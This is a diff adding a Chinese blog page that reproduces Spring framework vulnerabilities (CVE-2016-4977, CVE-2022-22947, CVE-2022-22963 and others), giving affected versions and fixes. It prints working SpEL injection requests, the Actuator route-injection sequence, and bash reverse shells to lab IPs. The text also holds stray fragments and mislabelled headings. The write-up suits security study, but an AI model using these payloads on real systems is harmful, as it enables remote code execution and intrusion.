@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta name="author" content="Dong Yuanxin">
+  
+  
+  <title>Spring | hcncn6</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="漏洞复现,">
+  
+
+  
+  <meta name="description" content="hcncn小站">
+
+  
+
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":true},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2018-11-1",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "Dong Yuanxin",
+    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">博客0v0</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | 博客重建中，还有其他细节文章</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/hcncn6" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2022-09-05
+    </span>
+    
+      <span>
+        | <a href="/categories/漏洞复现/"><i class="fa fa-bookmark"></i>漏洞复现</a>
+      </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    Spring
+  </h1>
+  
+  <article class="passage-article">
+    <p><code>`</code><br>简介<br>    Spring框架是一个开放源代码的J2EE应用程序框架，是针对bean的生命周期进行管理的轻量级容器。Spring可以单独应用于构筑应用程序，也可以和Struts、Webwork、Tapestry等众多Web框架组合使用，并且可以与 Swing等桌面应用程序AP组合。</p>
+<pre><code>Spring框架主要由七部分组成
+     Spring Core
+    Spring AOP
+    Spring ORM
+    Spring DAO
+    Spring Context
+    Spring Web
+    Spring Web MVC
+组成简介
+    1.Spring Framework
+</code></pre><p>也就是我们经常说的spring框架，包括了ioc依赖注入，Context上下文、bean管理、springmvc等众多功能模块，其它spring项目比如spring boot也会依赖spring框架。<br>        2.springBoot<br>它的目标是简化Spring应用和服务的创建、开发与部署，简化了配置文件，使用嵌入式web服务器，含有诸多开箱即用的微服务功能，可以和spring cloud联合部署。Spring Boot的核心思想是约定大于配置，应用只需要很少的配置即可，简化了应用开发模式。<br>        3.Spring Data<br>是一个数据访问及操作的工具集，封装了多种数据源的操作能力，包括：jdbc、Redis、MongoDB等。<br>        4.springCloud<br>是一套完整的微服务解决方案，是一系列不同功能的微服务框架的集合。Spring Cloud基于Spring Boot，简化了分布式系统的开发，集成了服务发现、配置管理、消息总线、负载均衡、断路器、数据监控等各种服务治理能力。比如sleuth提供了全链路追踪能力，Netflix套件提供了hystrix熔断器、zuul网关等众多的治理组件。config组件提供了动态配置能力，bus组件支持使用RabbitMQ、kafka、Activemq等消息队列，实现分布式服务之间的事件通信。<br>        5.Spring Security<br>主要用于快速构建安全的应用程序和服务，在Spring Boot和Spring Security OAuth2的基础上，可以快速实现常见安全模型，如单点登录，令牌中继和令牌交换。你可以了解一下oauth2授权机制和jwt认证方式。oauth2是一种授权机制，规定了完备的授权、认证流程。JWT全称是JSON Web Token，是一种把认证信息包含在token中的认证实现，oauth2授权机制中就可以应用jwt来作为认证的具体实现方法。<br>Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）<br>    漏洞原理：Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。<br>    影响版本：<br>    Spring Security OAuth 2.0 – 2.0.9<br>    Spring Security OAuth 1.0 – 1.0.5<br>    复现<br>        poc验证是否存在漏洞，首先需要填写用户名和密码，这里填入admin:admin即可。<br>        /oauth/authorize?response_type=${233*233}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=<a href="http://test" target="_blank" rel="noopener">http://test</a><br>        bash -i &gt;&amp; /dev/tcp/192.168.31.74/9999 0&gt;&amp;1<br>        <a href="https://x.hacking8.com/java-runtime.html" target="_blank" rel="noopener">https://x.hacking8.com/java-runtime.html</a><br>        thon poc.py<br>Enter message to encode:bash -c<br>        替换233里面<br>        windows系统的poc如下<br>        <a href="http://localhost:8080/oauth/authorize" target="_blank" rel="noopener">http://localhost:8080/oauth/authorize</a>? response_type=calc.exe${T(java.lang.Runtime).getRuntime().exec(toString().substring(112,120))}&amp;client_id=secalert&amp;scope=openid&amp;redirect_uri=<a href="http://test" target="_blank" rel="noopener">http://test</a><br>    修复建议</p>
+<pre><code>1.使用1.0.x版本的用户应放弃在认证通过和错误这两个页面中使用Whitelabel这个视图
+</code></pre><p>2.使用2.0.x版本的用户升级到2.0.10以及更高的版本<br>Spring Web Flow 远程代码执行漏洞（CVE-2017-4971）<br>    漏洞原理：Spring Web Flow (SWF) 是Spring Framework的一个脱离模块，<br>是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。该漏洞源于在Model的数据绑定上没有指定相关model的具体属性，从而导致恶意的表达式可以通过表单提交并且被执行，导致远程代码执行。<br>    影响版本：Spring Web Flow 2.4.0 - 2.4.4<br>Spring Messaging 远程命令执行漏洞（CVE-2018-1270）<br>    Spring messaging为spring框架提供消息支持，其上层协议是STOMP，底层通信基于SockJS。在spring messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用StandardEvaluationContext解析，造成命令执行漏洞。<br>    影响版本：</p>
+<pre><code>        Spring Framework 5.0 to 5.0.4.
+Spring Framework 4.3 to 4.3.14
+</code></pre><p>Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）<br>    漏洞原理：Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p>
+<pre><code>影响版本：
+Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)
+Spring Data Commons 2.0 to 2.0.5 (Kay SR5)
+Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)
+Spring Data REST 3.0 - 3.0.5 (Kay SR5)
+</code></pre><p>Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）</p>
+<pre><code>漏洞原理：Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。
+
+影响版本：
+</code></pre><p>Spring Cloud Gateway 3.1.0<br>Spring Cloud Gateway 3.0.0 - 3.0.6<br>Spring Cloud Gateway 其他已不再更新的版本<br>    复现<br>        首先，发送如下数据包即可添加一个包含恶意SpEL表达式的路由：</p>
+<p>POST /actuator/gateway/routes/1_Rytest HTTP/1.1<br>Host: 192.168.31.74:8080<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36<br>Connection: close<br>Content-Type: application/json<br>Content-Length: 329</p>
+<p>{<br>  “id”: “1_Rytest”,<br>  “filters”: [{<br>    “name”: “AddResponseHeader”,<br>    “args”: {<br>      “name”: “Result”,<br>      “value”: “#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\”id\”}).getInputStream()))}”<br>    }<br>  }],<br>  “uri”: “<a href="http://example.com&quot;" target="_blank" rel="noopener">http://example.com&quot;</a><br>}</p>
+<p>Image</p>
+<p>然后，发送如下数据包应用刚添加的路由。这个数据包将触发SpEL表达式的执行：</p>
+<p>POST /actuator/gateway/refresh HTTP/1.1<br>Host: 192.168.31.74:8080<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 0</p>
+<p>Image</p>
+<p>然后，发送如下数据包应用刚添加的路由。这个数据包将触发SpEL表达式的执行：</p>
+<p>GET /actuator/gateway/routes/1_Rytest HTTP/1.1<br>Host: 192.168.31.74:8080<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 0</p>
+<p>Image</p>
+<p>最后，发送如下数据包清理现场，删除所添加的路由：</p>
+<p>DELETE /actuator/gateway/routes/1_Rytest HTTP/1.1<br>Host: 192.168.31.74:8080<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36<br>Connection: close</p>
+<p>Image</p>
+<p>POST /actuator/gateway/refresh HTTP/1.1<br>Host: 192.168.31.74:8080<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 0</p>
+<p>Image</p>
+<p>验证看看，清理成功</p>
+<pre><code>修复方案
+</code></pre><p>1）3.1.x用户应升级到3.1.1+；<br>2）3.0.x用户应升级到3.0.7+；<br>3）如果不需要Actuator功能，可以通过management.endpoint.gateway.enable：false配置将其禁用。<br>Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）<br>    漏洞原理<br>    Spring Cloud Function 提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像 Amazon AWS Lambda 这样的 FaaS（函数即服务，function as a service）平台。当Spring Cloud Function 启用动态路由functionRouter时， HTTP请求头spring.cloud.function.routing-expression参数存在SPEL表达式注入漏洞，攻击者可通过该漏洞进行远程命令执行。<br>    影响版本<br>    ：3 &lt;= 版本 &lt;= 3.2.2<br>    POST /functionRouter HTTP/1.1<br>Host: localhost:8080<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36<br>Connection: close<br>spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(“/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/172.20.10.13/9999 0&gt;&amp;1”)<br>Content-Type: text/plain<br>Content-Length: 4<br>1<br>    test<br>Spring Framework远程代码执行漏洞(CVE-2022-22965)<br>    漏洞原理：2022年3月31日，VMware Tanzu发布漏洞报告，Spring Framework存在远程代码执行漏洞，在 JDK 9+ 上运行的 Spring MVC 或 Spring WebFlux 应用程序可能容易受到通过数据绑定的远程代码执行 (RCE) 的攻击。利⽤class对象构造利⽤链，对Tomcat的日志配置进行修改，然后，向⽇志中写⼊shell。<br>    漏洞原理：<br>Apache Tomcat作为Servlet容器；<br>使用JDK9及以上版本的Spring MVC框架；<br>Spring框架以及衍生的框架spring-beans-*.jar文件或者存在<br>CachedIntrospectionResults.class</p>
+<pre><code>影响版本：
+Spring Framework &lt; 5.3.18 非墨客
+</code></pre><p>Spring Framework &lt; 5.2.20<br>    复现<br>    0x07 漏洞修复方式<br>(一) WAF防护<br>在WAF等网络防护设备上，根据实际部署业务的流量情况，实现对class.<em>， Class.</em>，<em>.class.</em>，<em>.Class.</em> 等字符串的规则过滤，并在部署过滤规则后，对业务运行情况进行测试，避免产生额外影响。<br>(二) 临时修复措施<br>需同时按以下两个步骤进行漏洞的临时修复:<br>1.在应用中全局搜索@InitBinder注解，看看方法体内是否调用dataBinder.setDisallowedFields方法，如果发现此代码片段的引入,则在原来的黑名单中，添加{“class.<em>“,”Class.</em>“,”<em>.class.</em>“,”<em>.Class.</em>“}。(注:如果此代码片段使用较多，需要每个地方都追加)</p>
+<ol start="2">
+<li>在用系统的项目包下新建以下全局类，并保证这个类被Spring 加载到(推荐在Controller所在的包中添加)。完成类添加后，需对项目进行重新编译打包和功能验证测试，并重新发布项目。</li>
+</ol>
+
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: hcncn</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://hcncn6.github.io/2022/09/05/复现/Spring/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+</div>
+
+    </main>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="/2022/09/05/复现/Weblogic/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/2022/09/05/复现/log4j2/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+  
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
